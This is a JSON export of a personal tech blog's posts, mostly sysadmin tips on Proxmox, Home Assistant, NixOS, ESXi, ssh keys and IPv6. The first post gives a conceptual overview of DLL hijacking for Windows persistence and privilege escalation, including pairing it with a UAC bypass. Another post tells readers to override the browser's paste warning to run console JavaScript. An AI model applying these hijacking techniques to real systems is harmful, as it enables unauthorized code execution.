[{"content":"Today I was looking at something new to learn and I came accross some material on DLL Hijacking. Previously I was only really aware of DLL search order hijacking, but I was interested to see that theres actually several varients to this idea. It may be best to first explain what a DLL is before talking about methods of manipulation. A DLL is a shared object or a snippet of code that several applications and operating system components can import for many common functions as to not have to re-invent the wheel on many things. Since many vital applications and operating system components need these DLLs, there is an opportunity for arbitrary code execution if you can somehow influence an application to load your DLL. There are many techniques to do so, many of them are very similar so I categorize them as such:\nReplacing DLLS: This is the easiest concept to understand as you simply replace the legitimate DLL with your compromised one. This typically requires a higher level of privilege as many DLLs reside in privileged locations. This can be taken a step further with DLL Proxying, which consists of trojanizing a DLL, which can forward calls to the intended location as well as intercept and interpret calls itself. I would like to talk more about DLL Proxying in a later blog post because it is the coolest one in my opinion, but until then you can check out this blog post: https://kevinalmansa.github.io/application%20security/DLL-Proxying/ . Hijacking Priority: Windows has a specific order in which is searches for libraries as many versions of the same DLL can exist on a system, the order itself isn\u0026rsquo;t as important but you can read more about it here. What is more important is if you can place a cmpromised DLL in a location higher in the search priority than the legitimate application, then your compromised DLL will be loaded instead. This is referred to as DLL search order hijacking and many flavors of it exist that do it in slightly different ways, you can read more about them here. At the time of writing (20250211) Windows has over opportunities for DLL Hijacking. You can scan a system using the Sysinternals Procmon utility to identify them, the blog post linked above also has a helper script that outputs your candidates to a CSV: https://github.com/wietze/windows-dll-hijacking/tree/master/1_finding_candidates . When Hijacking DLLs, you are largely subject to the privilege levels that the application that loads the DLL has. This technique can be combined with User Accont Control (UAC) bypass to elevate privileges while also bypassing the need for the user to confirm. There are many sneaky techniques such as taking advantage of the \u0026ldquo;friendliness\u0026rdquo; in the windows command environment to include characters such as white spaces that are eliminated upon evaluation this is a pretty good blog post that goes more in depth. I have only scratched the surface but I would like to explore more on these in the future as it is an incredibly interesting concept.\n","date":"2025-02-06","id":0,"permalink":"/blog/20250206/","summary":"Today I was looking at something new to learn and I came accross some material on DLL Hijacking. Previously I was only really aware of DLL search order hijacking, but I was interested to see that theres actually several varients to this idea. It may be best to first explain what a DLL is before talking about methods of manipulation. A DLL is a shared object or a snippet of code that several applications and operating system components can import for many common functions as to not have to re-invent the wheel on many things.","tags":["SOC","Windows","DLL Hijacking","Persistence","Privilege Escalation","Fundamentals"],"title":"06FEB25 - DLL Hijacking "},{"content":"Today I was looking into some stuff for SSH and I wanted to know more about the maths behind how diffie helman works and since its just always something I took for granted so today I learned. Below is a simple graphic that I made that illustrates the process of the key exchange.\nSo what does this mean? Well asymetric cryptography is built upon the idea of creating a shared secret independently without passing it over the public internet. Diffie-Helman arised as a method of doing so. So how does this work you ask? Our first subject Alice comes up with a random number, for illustration purposes this number is small, but his is usually a very large number. Bob indenpendently does the same, both of these numbers are unique and never shared and will be regfered to as a private key. What is shared are two other numbers g and n, these numbers can be whatever as long as g is small and prime and n is very large. These numbers will be used in a mathematcal function to create something they can share, a piblic key. This public key can easily be derived if you have the private key, but the math doesnt work that well the other way around, this is due to the modulus operation. Modulus is simply the remander left over after a number is divided into another one evenly as many times as possibly. It is improbable for me to know how many times the number fit into the other one cleanly with just the remainder without simply guessing every possibility. If our private keys and n operator are large enough, this will again be very impractical. The colors here are to represent that our numbers as they are combined. While I know that yellow is in the public domain and alice\u0026rsquo;s public key is orange, i dont know the exact shade of red or quantity that she used to make this orange which would make it very difficult to replicate without trial and error.\nNow that we have established both public and private keys, our partiies can exchange their public keys and add their private keys to the result with the same method used to create the public keys. The result should independently create the same key, which is apparent as both users have arrived to the number 7 and the color brown. As the numbers increase in size, the likelyhood that the symetric key will be the same as a user\u0026rsquo;s private key decreases as well.\n","date":"2025-01-09","id":1,"permalink":"/blog/20250109/","summary":"Today I was looking into some stuff for SSH and I wanted to know more about the maths behind how diffie helman works and since its just always something I took for granted so today I learned. Below is a simple graphic that I made that illustrates the process of the key exchange.\nSo what does this mean? Well asymetric cryptography is built upon the idea of creating a shared secret independently without passing it over the public internet.","tags":["Diffie Helman","Cryptography","Encryption"],"title":"09JAN25 - Diffie Helman"},{"content":"So I didn\u0026rsquo;t do anything today so I\u0026rsquo;m going to take today to write about NixOS. I started using NixOS recently because I would like to incorporate declarative and immutable operating systems into my research. I was introduced to NixOS via one of my favorite podcasts Linux Unplugged. I wasn\u0026rsquo;t initially sold on it because it sounded like a fad, but so far its pretty cool. This is how I understand it.\nTheres a difference between Nix and NisOS. Nix is a package manager. At the time of writing it has eclipsed the AUR as the largest Linux repo. You can use Nix and not have to use NixOS, ive heard people using it on other Linux Operating systems and even on Mac. I need to figure out how the packaging works exactly so that I can understand why this works, because I think that\u0026rsquo;s pretty powerful that it does. NixOS is the entire operating system. From what I understand NixOS is atomic, meaning all changes to the operating system happen at once so updates work in a copy-on-write fashion where updates are applied as an entire system snapshot. The system itself is read only to the actual user and any actual system changes are made via the /etc/nixos/configuration.nix file. Any time you make changes to your system it is built from scratch and put in a read only state. Files in your home directory are safe from this destructive change meaning you can roll back to a previous iteration of you OS but still keep your files.\nNow lets talk about Flakes, I am by no means an expert on this, nor am I sure that I even understand it fully quite yet but flakes can allow an additional layer of reproducibility to your NixOS. Because you dont specify package versions when you download packages, if I wanted to work on a specific config such a jellyfin server sitting behind an nginx proxy, I could create a configuration file, in this case a flake.nix to make sure these two things are installed and configured correctly. This setup has no guarantees to ensure that the versions are the same when someone else uses my config file as they will simply be downloading the lastest versions of the applications. Flakes step in to help that by using a system of inputs and outputs which define the repository locations and the development environments respectively (im sure it does other stuff too). It then goes about creating a flake.lock file from your configuration, which will be a listing of the exact versions of the applications installed ensuring that when someone else installs it they will get the exact same setup and not just the latest version.\nTo see nix in action check out my NixOS config here. It is a pretty basic setup so far, but I hope to add more in the future as I understand it more.\n","date":"2025-01-02","id":2,"permalink":"/blog/20250102/","summary":"So I didn\u0026rsquo;t do anything today so I\u0026rsquo;m going to take today to write about NixOS. I started using NixOS recently because I would like to incorporate declarative and immutable operating systems into my research. I was introduced to NixOS via one of my favorite podcasts Linux Unplugged. I wasn\u0026rsquo;t initially sold on it because it sounded like a fad, but so far its pretty cool. This is how I understand it.","tags":["NixOS","Declaritive Build","Immutable Operating Systems","Flakes"],"title":"02JAN25 - NixOS"},{"content":"Hello, this is the beginning of my (somewhat) daily blog. The intention of this blog is less of an exercise in writing about my life and more of a exercise in making a habit of documentation. I plan to write daily about lessons I learned about computers that day and I\u0026rsquo;m sure there will be a non-computer related blog or two. When I implement tagging and search, I will make sure that things are tagged appropriately. Now let\u0026rsquo;s get into the first blog post:\nI would like to update my site from my current Google Sites posting to a site dynamically built via Hugo, delivered through a GitHub CI/CD pipeline (maybe a Gitlab one in the future), and ultimately served over either GitHub Pages or Cloudflare Pages. I settled on Hugo after I heard about it on one of my favorite podcasts (Linux Unplugged)[https://linuxunplugged.com/] since they have a similar setup for their site (JupiterBroadcasting.com)[https://github.com/JupiterBroadcasting/jupiterbroadcasting.com] I plan to take it further, mainly as an academic exercise, but also to have a method of deploying my site that allows me a bit more flexibility and a lot more pizzaz. Once I learn the GitHub side of things, I plan to tear it down and rebuild it on Gitlab Pages for a fully open-source tech stack.\nSo far I installed Hugo, but I kept running into issues working through the QuickStart for the theme I was trying to use which led to some frustration. From what I understand there\u0026rsquo;s a couple different ways for me to run Hugo on my system\nInstall it from the package repo This is my usual go to. I was attempting this on my Ubuntu 24.04 laptop but I ran into a couple issues. Hugo is written in (Go)[https://go.dev/] and as a consequence of that, the things you want to do in are dependent on the version of Go you have on your system The package maintainers are pretty good at ensuring the version of Hugo in the package repo does not rely on a Go version that isn\u0026rsquo;t in the package repo. Theme developers are not the same (and nor should they have to be), and that\u0026rsquo;s the issue that I face today. In order to install and run the theme so that I can edit and develop locally, I need a version of Go that is more updated than the one in the repos. I usually don\u0026rsquo;t have this issue much, but choosing an LTS has really bit me. Install the Snap Usually if something like this happens, I check the Snap repository because projects are sometimes nice enough to make a snap available that has all the necessary components bundled up. A lot of people don\u0026rsquo;t like snaps, but I\u0026rsquo;m pretty happy using them when they\u0026rsquo;re available. I usually keep systems installed for long periods of time and will upgrade instead of doing a nuke and pave when the time has come for me to do so. Snaps have helped me reduce overall system crud to aid in this endeavor. Unfortunately this did not work either since the Hugo snap is bundled with Go and that version is older too, installing the Go snap (which is the correct version) doesn\u0026rsquo;t really help with that either because the snap isn\u0026rsquo;t looking there. Build From Source I don\u0026rsquo;t like building from source, because cleaning up after myself sucks, also I want to upgrade my packages with the system. Maybe I just need to learn the process better to get more comfortable with it These were my issues with Hugo. My solution was to use NixOs I have NixOS installed on an old laptop because I\u0026rsquo;m trying to learn more about it to integrate immutable and declarative operating systems into my current research for school and I have got to say that its pretty incredible. Getting this project started on NixOS was as simple as adding a couple lines to my config to install Hugo, Go, and NodeJS and running through the QuickStart guide. While I understand that the fix was not unique to NixOs, and that I would have had similar success with a rolling distro like Arch Linux I had NixOs already around and it worked well, I\u0026rsquo;m becoming more and more sold on the idea of NixOS so I\u0026rsquo;m happy to be finding more uses for it in my daily life.\n","date":"2025-01-01","id":3,"permalink":"/blog/20250101/","summary":"Hello, this is the beginning of my (somewhat) daily blog. The intention of this blog is less of an exercise in writing about my life and more of a exercise in making a habit of documentation. I plan to write daily about lessons I learned about computers that day and I\u0026rsquo;m sure there will be a non-computer related blog or two. When I implement tagging and search, I will make sure that things are tagged appropriately.","tags":["CI/CD","GitHub","GitHub Pages","GitHub Actions"],"title":"01JAN25 - Hugo Site Plans"},{"content":"Bash scripts are very sensitive to line endings which can cause some portability issues between windows and unix-like systems (depending on how the text editor encodes line breaks). If you would like to see the invisible characters that are making your life confusing simply type:\ncat -v \u0026lt;FILE\u0026gt; The easiest solution to this issue is a simple sed replace line:\nsed -i -e \u0026#39;s/\\r$//\u0026#39; \u0026lt;FILE\u0026gt; ","date":"2023-11-23","id":4,"permalink":"/blog/00_legacy_bash_bad_interpreter/","summary":"Bash scripts are very sensitive to line endings which can cause some portability issues between windows and unix-like systems (depending on how the text editor encodes line breaks). If you would like to see the invisible characters that are making your life confusing simply type:\ncat -v \u0026lt;FILE\u0026gt; The easiest solution to this issue is a simple sed replace line:\nsed -i -e \u0026#39;s/\\r$//\u0026#39; \u0026lt;FILE\u0026gt; ","tags":["bash","linux","Legacy"],"title":"/bin/bash^M: bad interpreter"},{"content":"So for some reason in v2021.7.0 HomeAssistant introduced a bug that breaks a lot of systems that rely on its NGINX reverse proxy add-on to provide ssl capabilities. Thankfully the fix itself is pretty simple.\nTo begin, try to navigate to the site to produce the error, then in the HAS web GUI navigate to the Supervisor Logs (Settings\u0026gt;System\u0026gt;Logs)\nGrab the IP that shows up in the error that reads\n\u0026#34;A request from a reverse proxy was received from XXX.XXX.XXX.XXX, but your HTTP integration is not set-up for reverse proxies\u0026#34; From here navigate to your configuration file in your chosen method (/config/configuration.yaml) where we will make edits.\nAdd the following line, including the IP you grabbed from the logs\nhttp:\ruse_x_forwarded_for: true\rtrusted_proxies:\r- XXX.XXX.XXX.XXX Reboot the machine ","date":"2023-11-23","id":5,"permalink":"/blog/00_legacy_400_bad_request_ha-copy/","summary":"So for some reason in v2021.7.0 HomeAssistant introduced a bug that breaks a lot of systems that rely on its NGINX reverse proxy add-on to provide ssl capabilities. Thankfully the fix itself is pretty simple.\nTo begin, try to navigate to the site to produce the error, then in the HAS web GUI navigate to the Supervisor Logs (Settings\u0026gt;System\u0026gt;Logs)\nGrab the IP that shows up in the error that reads","tags":["HomeAssistant","Web Apps","NGINX","Legacy"],"title":"400: Bad Request in HomeAssistant"},{"content":"So for some reason in v2021.7.0 HomeAssistant introduced a bug that breaks a lot of systems that rely on its NGINX reverse proxy add-on to provide ssl capabilities. Thankfully the fix itself is pretty simple.\nTo begin, try to navigate to the site to produce the error, then in the HAS web GUI navigate to the Supervisor Logs (Settings\u0026gt;System\u0026gt;Logs)\nGrab the IP that shows up in the error that reads\n\u0026#34;A request from a reverse proxy was received from XXX.XXX.XXX.XXX, but your HTTP integration is not set-up for reverse proxies\u0026#34; From here navigate to your configuration file in your chosen method (/config/configuration.yaml) where we will make edits.\nAdd the following line, including the IP you grabbed from the logs\nhttp:\ruse_x_forwarded_for: true\rtrusted_proxies:\r- XXX.XXX.XXX.XXX Reboot the machine ","date":"2023-11-23","id":6,"permalink":"/blog/00_legacy_400_bad_request_ha/","summary":"So for some reason in v2021.7.0 HomeAssistant introduced a bug that breaks a lot of systems that rely on its NGINX reverse proxy add-on to provide ssl capabilities. Thankfully the fix itself is pretty simple.\nTo begin, try to navigate to the site to produce the error, then in the HAS web GUI navigate to the Supervisor Logs (Settings\u0026gt;System\u0026gt;Logs)\nGrab the IP that shows up in the error that reads","tags":["HomeAssistant","Web Apps","NGINX","Legacy"],"title":"400: Bad Request in HomeAssistant"},{"content":"The Proxmox team doesnt really have any plans on changing the default port assigned to Proxmox (8006) and their documentation just tells you to use nginx to proxy the traffic if you want to change the default port so the following script should change your port to the port of your choosing [with 443 as the default].\n#!/bin/bash\r#Install nginx\rapt install nginx\r#Checks for your default nginx file and deletes it\rFILE=/etc/nginx/conf.d/default\rif [-f \u0026#34;FILE\u0026#34;];then\rrm $FILE\relse\rrm /etc/nginx/sites-enabled/default\rfi\r#Pull the FQDN out of the hosts file\rread -p \u0026#34;Enter the FQDN of your server or [ENTER] to set to default from /etc/hosts file\u0026#34; FQDN\rif [ -z FQDN ]\rthen FQDN=$(hostname -f)\rfi\r#Create your new nginx File\rcat \u0026gt; /etc/nginx/conf.d/proxmox.conf \u0026lt;\u0026lt; EOF\rupstream proxmox {\rserver \u0026#34;$FQDN\u0026#34;;\r}\rserver {\rlisten 80 default_server;\rrewrite ^(.*) https://$host$1 permanent;\r}\rserver {\rlisten 443;\rserver_name _;\rssl on;\rssl_certificate /etc/pve/local/pve-ssl.pem;\rssl_certificate_key /etc/pve/local/pve-ssl.key;\rproxy_redirect off;\rlocation / {\rproxy_http_version 1.1;\rproxy_set_header Upgrade $http_upgrade;\rproxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_pass https://localhost:8006;\rproxy_buffering off;\rclient_max_body_size 0;\rproxy_connect_timeout 3600s;\rproxy_read_timeout 3600s;\rproxy_send_timeout 3600s;\rsend_timeout 3600s;\r}\r}\rEOF\r#test your config\rnginx -t\r#reload nginx\rnginx -s reload\r#creating some dependencies via systemd overrides\rcat \u0026gt; /etc/systemd/system/nginx.service.d/override.conf \u0026lt;\u0026lt; EOF\r[Unit]\rRequires=pve-cluster.service\rAfter=pve-cluster.service\rEOF\rsystemctl restart nginx\rsystemctl enable --now nginx ","date":"2023-11-23","id":7,"permalink":"/blog/00_legacy_change_proxmox_port/","summary":"The Proxmox team doesnt really have any plans on changing the default port assigned to Proxmox (8006) and their documentation just tells you to use nginx to proxy the traffic if you want to change the default port so the following script should change your port to the port of your choosing [with 443 as the default].\n#!/bin/bash\r#Install nginx\rapt install nginx\r#Checks for your default nginx file and deletes it\rFILE=/etc/nginx/conf.","tags":["ProxMox","nginx","Legacy"],"title":"Change Proxmox Default Port (Kinda)"},{"content":"I don\u0026rsquo;t really like like allowing servers to set their own IP addresses, i think its kinda weird and i like to handle things at the network level so I typically have all my servers as DHCP clients and I set their addresses statically on the network device they\u0026rsquo;re attached to. Unfortunately proxmox doesn\u0026rsquo;t like that so it doesn\u0026rsquo;t include DHCP in the installer, which is fine. Its easily fixed.\nThe Fix# Open up /etc/network/interfaces in your text editor of choice. and remove the Gateway and Netmask lines under auto vmbr0. Then replace the line with iface vmbr0 inet dhcp\nYour file should read something like\n...\riface eth0 inet manual\rauto vmbr0\riface vmbr0 inet dhcp\rbridge_ports eth0\rbridge_stp off\rbridge_fd\r... ","date":"2023-11-23","id":8,"permalink":"/blog/00_legacy_change_proxmox_to_dhcp/","summary":"I don\u0026rsquo;t really like like allowing servers to set their own IP addresses, i think its kinda weird and i like to handle things at the network level so I typically have all my servers as DHCP clients and I set their addresses statically on the network device they\u0026rsquo;re attached to. Unfortunately proxmox doesn\u0026rsquo;t like that so it doesn\u0026rsquo;t include DHCP in the installer, which is fine. Its easily fixed.","tags":["Proxmox","dhcp","Legacy"],"title":"Change Proxmox to DHCP Client"},{"content":"As much as I love Home assistant there are some small papercuts that can make it annoying to deal with, this is one of them. Every time you elect to \u0026ldquo;stay signed in\u0026rdquo; and you don\u0026rsquo;t sign out before exiting the page you\u0026rsquo;ll have a nice token sitting in this long list of your previous mistakes. I found this quick fix on Reddit, but understand that this will clear ALL the tokens in your home assistant (even the session that youre currently in) so you\u0026rsquo;ll have to log back in. In order to do it, just pop open your web console and paste the following javascript in there, your browser might bark at you saying something about pasting untrusted code, just allow pasting and keep it pushing.\nhass = document.getElementsByTagName(\u0026#39;home-assistant\u0026#39;)[0].hass;\rhass.callWS({\rtype: \u0026#34;auth/refresh_tokens\u0026#34;\r})\r.then(r =\u0026gt; r.filter(t =\u0026gt; t.type == \u0026#39;normal\u0026#39;).map(t =\u0026gt; hass.callWS({\rtype: \u0026#34;auth/delete_refresh_token\u0026#34;,\rrefresh_token_id: t.id\r}))); ","date":"2023-11-23","id":9,"permalink":"/blog/00_legacy_clear_has_refresh/","summary":"As much as I love Home assistant there are some small papercuts that can make it annoying to deal with, this is one of them. Every time you elect to \u0026ldquo;stay signed in\u0026rdquo; and you don\u0026rsquo;t sign out before exiting the page you\u0026rsquo;ll have a nice token sitting in this long list of your previous mistakes. I found this quick fix on Reddit, but understand that this will clear ALL the tokens in your home assistant (even the session that youre currently in) so you\u0026rsquo;ll have to log back in.","tags":["Home Assistant","Tokens","Authentication","Legacy"],"title":"Clear Home Assistant Refresh Tokens"},{"content":"This tutorial is assuming that you already have Tailscale installed on your Proxmox hosts, if you havent done so look at the installation for Tailscale on Debaian Bullseye.\nInstall# Because /etc/hosts has priority in all host lookups we are just going to edit the these files on any of the machines that we would like to connect. To do so you can simply vim /etc/hosts and your new host files will end up looking like this with host being the node you want to start the cluster on and remote being the node that will join the cluster\n127.0.0.1 localhost.localdomain localhost\r# 192.168.1.12 host.domain.com host (this is the original LAN address)\r111.222.111.222 host.domain.com host\r111.222.111.223 remote.domain.com remote Make sure that the /etc/host file is present on both machines before you run the pvecm commands.\nOn the Host you will create the cluster with a name you choose\n# pvecm create \u0026lt;CLUSTER_NAME\u0026gt;\rpve create testcluster On the remote node you will join the cluster BY HOSTNAME (not IP like the Proxmox Docs show).\npvecm add \u0026lt;HOST_HOSTNAME\u0026gt;\rpvecm add host Done\u0026hellip; Thats it.\n","date":"2023-11-23","id":10,"permalink":"/blog/00_legacy_proxmox_over_tailscale/","summary":"This tutorial is assuming that you already have Tailscale installed on your Proxmox hosts, if you havent done so look at the installation for Tailscale on Debaian Bullseye.\nInstall# Because /etc/hosts has priority in all host lookups we are just going to edit the these files on any of the machines that we would like to connect. To do so you can simply vim /etc/hosts and your new host files will end up looking like this with host being the node you want to start the cluster on and remote being the node that will join the cluster","tags":["ProxMox","Tailscale","Legacy"],"title":"Connecting ProxMox cluster over Tailscale"},{"content":"I ran into this issue today so I thought that i would put a solution that I found on here. If you ever run into a situation in which you need to copy your ssh keys to another box but you dont have the handy dandy ssh-copy-id tool, the following one liner should work. Check out this oracle web page for more info.\ncat ~/.ssh/id_rsa.pub | ssh \u0026lt;USER\u0026gt;@\u0026lt;IP\u0026gt; \u0026#39;cat \u0026gt;\u0026gt; .ssh/authorized_keys \u0026amp;\u0026amp; echo \u0026#34;Done\u0026#34;\u0026#39; ","date":"2023-11-23","id":11,"permalink":"/blog/00_legacy_coppy_ssh_keys/","summary":"I ran into this issue today so I thought that i would put a solution that I found on here. If you ever run into a situation in which you need to copy your ssh keys to another box but you dont have the handy dandy ssh-copy-id tool, the following one liner should work. Check out this oracle web page for more info.\ncat ~/.ssh/id_rsa.pub | ssh \u0026lt;USER\u0026gt;@\u0026lt;IP\u0026gt; \u0026#39;cat \u0026gt;\u0026gt; .","tags":["SSH","Keys","PKI","Legacy"],"title":"Copy ssh keys without ssh-copy-id"},{"content":"If you\u0026rsquo;re anything like me and (and a good other portion of the internet) you don\u0026rsquo;t want to be bothered with IPv6 addressing because \u0026ldquo;IPv4 still works\u0026rdquo; but eventually its time to grow up and realize you need to start becoming more familiar with IPv6 outside of basic textbook knowledge and today I\u0026rsquo;m gonna teach you how to create a random IPv6 private range for if you need to set up VLANs, VPN tunnels, or whatever.\nFirst off you\u0026rsquo;re gonna want to check out RFC4193 or just take my word for it that the IPv6 Local uni-cast prefix (private addressable range) is FC00::/7 and that we\u0026rsquo;re going to want to make one that\u0026rsquo;s unique to us by generating a locally assigned Global ID. The RFC states a good way to do this is by taking a string (like today\u0026rsquo;s date for example) and combining it with a system specific identifier like your machine ID after that to shake it up, we\u0026rsquo;ll hash it and grab the last 5 bytes. A pretty easy way to do that is with the following one liner:\nprintf $(echo -n `date +%s%N` \u0026amp;\u0026amp; cat /var/lib/dbus/machine-id) | sha1sum | head -c 40 | tail -c 10 This will leave you with a 10 digit (5 byte) string that you can append to the fd (or fc) prefix to look like this fdcc:9a66:f7b2:: because this is an insanely large prefix, best practice is to reduce it to a /64 for simplicity\u0026rsquo;s sake.\n","date":"2023-11-23","id":12,"permalink":"/blog/00_legacy_random_ipv6/","summary":"If you\u0026rsquo;re anything like me and (and a good other portion of the internet) you don\u0026rsquo;t want to be bothered with IPv6 addressing because \u0026ldquo;IPv4 still works\u0026rdquo; but eventually its time to grow up and realize you need to start becoming more familiar with IPv6 outside of basic textbook knowledge and today I\u0026rsquo;m gonna teach you how to create a random IPv6 private range for if you need to set up VLANs, VPN tunnels, or whatever.","tags":["IPv6","RFC4193","Networking","Legacy"],"title":"Creating a random private IPv6 Range"},{"content":"When you\u0026rsquo;re running ESXI without vCenter, sometimes really niche things come up and you have situations that are kind of a pain without the appropriate management software so sometimes you gotta be a little janky.\nSo Primarily you\u0026rsquo;re going to want to power off the VM you want to clone.\nThen you want to right click the VM and chose Edit Settings.\nIn the Virtual Hardware tab take not of the name and location of your Disk File. Next you\u0026rsquo;re going to open your Datastore Browser by going Storage and in the Datastores tab click the Datastore Browser button.\nNow that youre in the datastore browser create a directory at your prefered location with the name of the VM you would like.\nNow youre going to go to the location of your original VM and copy the .vmdk and .vmx files into your new directory.\nSometimes this can take a while, if you want to monitor the process. Click the Monior sidebar, then the Tasks tab. When your files are moved over, you can rename them if youd like.\nFinally, right click the .vmx file and choose Register VM.\nRename the actual VM if youd like.\n","date":"2023-11-23","id":13,"permalink":"/blog/00_legacy_clone_esxi_no_vcenter/","summary":"When you\u0026rsquo;re running ESXI without vCenter, sometimes really niche things come up and you have situations that are kind of a pain without the appropriate management software so sometimes you gotta be a little janky.\nSo Primarily you\u0026rsquo;re going to want to power off the VM you want to clone.\nThen you want to right click the VM and chose Edit Settings.\nIn the Virtual Hardware tab take not of the name and location of your Disk File.","tags":["Vmware","ESXI","Virtual Machines","vCenter","Legacy"],"title":"How to Clone a Virtual Machine in ESXI (without vCenter)"},{"content":"So for some reason that Home Assistant OS virtual machine doesn\u0026rsquo;t really like being on certain versions of Vmware ESXI (typically older versions as I assume they do their testing as close to the newer releases as possible). I believe the issue stems from needing to change your virtual disk to IDE instead of SCSI which causes some underlying hard drive integrity issues that they didn\u0026rsquo;t plan for. Nonetheless, the fix is pretty easy and just takes a couple of minutes on your time and a Linux terminal (or any terminal that can SSH I guess).\nFirst, you\u0026rsquo;re going to want to ssh to your machine and then navigate to where your virtual disk is held for instance mine is in /vmfs/volumes/65165c2c-a1999659-adf7-1866d5477f7 From there you\u0026rsquo;re going to want to run the following command to repair your hard disk (replace the value in quotes to your disk image name)\nvmkfstools -x repair \u0026#34;Home_Assistant_Image.vmdk\u0026#34; So from here, your immediate issue s resolved, but if you want to not run into this again you\u0026rsquo;re going to clone your hard disk and replace it with the new one. You can begin with the following command.\nvmkfstools -i \u0026#34;Home_Assistant_Image.vmdk\u0026#34; \u0026#34;New_Home_Assistant_Image.vmdk\u0026#34; Now from here enter your VM settings \u0026gt; Add Hard Disk \u0026gt; Existing Hard Disk and choose the new disk image. From there you can delete your old disk and boot your machine up again with no problems and you\u0026rsquo;ll have the added benefit of actually being able to do snapshots now.\n","date":"2023-11-23","id":14,"permalink":"/blog/00_legacy_object_type_hasos/","summary":"So for some reason that Home Assistant OS virtual machine doesn\u0026rsquo;t really like being on certain versions of Vmware ESXI (typically older versions as I assume they do their testing as close to the newer releases as possible). I believe the issue stems from needing to change your virtual disk to IDE instead of SCSI which causes some underlying hard drive integrity issues that they didn\u0026rsquo;t plan for. Nonetheless, the fix is pretty easy and just takes a couple of minutes on your time and a Linux terminal (or any terminal that can SSH I guess).","tags":["HomeAssistant","ESXI","Virtual Machines","Legacy"],"title":"Object type requires hosted I/O in HASOS on ESXI"},{"content":"Theres no real way to delete a cluster in the gui with out doing a fresh install (that i know of) but the following set of commands should stop the cluster service, force it to local, delete the configs and restart it like new.\nsystemctl stop pve-cluster\rsystemctl stop corosync\rpmxcfs -l\rrm /etc/pve/corosync.conf\rrm -r /etc/corosync/*\rkillall pmxcfs\rsystemctl start pve-cluster ","date":"2023-11-23","id":15,"permalink":"/blog/00_legacy_proxmox_delete_cluster/","summary":"Theres no real way to delete a cluster in the gui with out doing a fresh install (that i know of) but the following set of commands should stop the cluster service, force it to local, delete the configs and restart it like new.\nsystemctl stop pve-cluster\rsystemctl stop corosync\rpmxcfs -l\rrm /etc/pve/corosync.conf\rrm -r /etc/corosync/*\rkillall pmxcfs\rsystemctl start pve-cluster ","tags":["proxmox","cluster","Legacy"],"title":"Proxmox Delete Cluster"},{"content":"Introduction# For those who aren\u0026rsquo;t familiar with the concept. Different hypervisors use different file formats to represent VM images and due to the fact that Proxmox uses Qemu (Quick Emulator)/KVM (Kernel-based Virtual Machine) to provide virtualization, it in turn uses Qcow2 (Qemu Copy-On-Write) as the storage file format for virtual machines data. The process to move Qcow2 files into Proxmox may not be as straight forward as it is on VMware, but its still a relatively painless process.\nEnvironment Setup# First, you\u0026rsquo;re going to want to need a place to store the Qcow2 files that you\u0026rsquo;re going to copy and virtualize. Its probably best to put them near where VM ISOs and container images are stored like such:\nmkdir /var/lib/vz/template/qcow2 After this is created you can move the qcow2 file to your proxmox instance however you see fit. If you don\u0026rsquo;t have it saved quite yet, it may be easiest to simply use wget to pull the image from whatever repo you\u0026rsquo;re hoping to grab it from so save the bandwidth of saving it to your disk and then moving it to Proxmox.\nCreating the VM# We will begin setup by going to the Create VM action.\nFrom here in the General tab, we can give our VM a name, it should be automatically assigned an unique VM ID that you will need to notate for later.\nIn the OS tab, ensure that you click the Do not use any media radio button, from there you can either leave the guest OS as the default Linux, or change it to Other to avoid any possible default configuration issues.\nIn the System tab we should be able to leave all of the defaults here.\nIn the Disks tab we should change our VM\u0026rsquo;s size to how large we want it to be in Disk Size. You can change the Format to Qemu Image Format but the default Raw format should work, my Proxmox wouldn\u0026rsquo;t give me the option to change from raw.\nIn the CPU tab, give your VM the compute resources that it needs.\nIn the Memory tab, give your VM the memory that it needs.\nIn the Networking tab, ensure your VM has the networking capabilities that it requires if you would like it to connect over the network.\nFrom there you can hit the Finish button to create your VM.\nImporting Disks# Up to this point, we\u0026rsquo;ve simply created a VM without a bootable operating system. From here we will actually import the Qcow2 image and therefore make our VM usable. Ensure you have these pieces of information handy: VM ID, Proxmox Storage Cluster Name(usually just local or local-zfs), absolute file path of the QCOW2 image.\nFrom your terminal, importing the image is fairly easy using the built-in command:\nqm importdisk \u0026lt;VM_ID\u0026gt; \u0026lt;QCOW2_FILE\u0026gt; \u0026lt;PROXMOX_ STORAGE\u0026gt; After that, watch the transfer fly.\nSwapping Disks# Click on your VM and then go to Hardware \u0026gt; Click the Unused Disk at the bottom of the hardware array \u0026gt; and then click the Edit option at the top.\nFrom there we will change the Bus Device to VirtIO Block to ensure our VM can take advantage of the best possible performance.\nNow we need to change the boot order, so go to Options \u0026gt; Boot Order and move the VirtIO disk to the top. Click OK to save.\nFrom here you should be able to boot your VM. Give yourself a pat on the back.\n","date":"2023-11-23","id":16,"permalink":"/blog/00_legacy_proxmox_qcow2_import/","summary":"Introduction# For those who aren\u0026rsquo;t familiar with the concept. Different hypervisors use different file formats to represent VM images and due to the fact that Proxmox uses Qemu (Quick Emulator)/KVM (Kernel-based Virtual Machine) to provide virtualization, it in turn uses Qcow2 (Qemu Copy-On-Write) as the storage file format for virtual machines data. The process to move Qcow2 files into Proxmox may not be as straight forward as it is on VMware, but its still a relatively painless process.","tags":["Proxmox","qcow2","qemu","Legacy"],"title":"Proxmox Qcow2 Import"},{"content":"If you ever want a simple way to pull your public keys from Github so that you can use your safely stored ssh private keys where you need them.\ncurl https://github.com/[USERNAME].keys This command will put it in your authorized_keys file which will actually allow you to use them in ssh.\ncurl https://github.com/[USERNAME].keys | tee -a ~/.ssh/authorized_keys ","date":"2023-11-23","id":17,"permalink":"/blog/00_legacy_pull_pulic_keys_git/","summary":"If you ever want a simple way to pull your public keys from Github so that you can use your safely stored ssh private keys where you need them.\ncurl https://github.com/[USERNAME].keys This command will put it in your authorized_keys file which will actually allow you to use them in ssh.\ncurl https://github.com/[USERNAME].keys | tee -a ~/.ssh/authorized_keys ","tags":["Github","pki","keys","Legacy"],"title":"Pull public keys from Github url"},{"content":"Sometimes when trying to replace text using the sed command line tool you will tun into the issue in which your text has the forward slash characters which can be a bit of a headache because thats what sed uses to delimit strings. Thankfully the delimiter is pretty flexible. I like to use the pipe \u0026ldquo;|\u0026rdquo; symbol, but pretty much any other symbol will work such as the tilde \u0026ldquo;`\u0026rdquo; or the colon \u0026ldquo;:\u0026rdquo; ex:\nsed -i \u0026#39;s|TEXT|REPLACEMENT_TEXT|g\u0026#39; test.txt\rsed -i \u0026#39;s:TEXT:REPLACEMENT_TEXT:g\u0026#39; test.txt\rsed -i 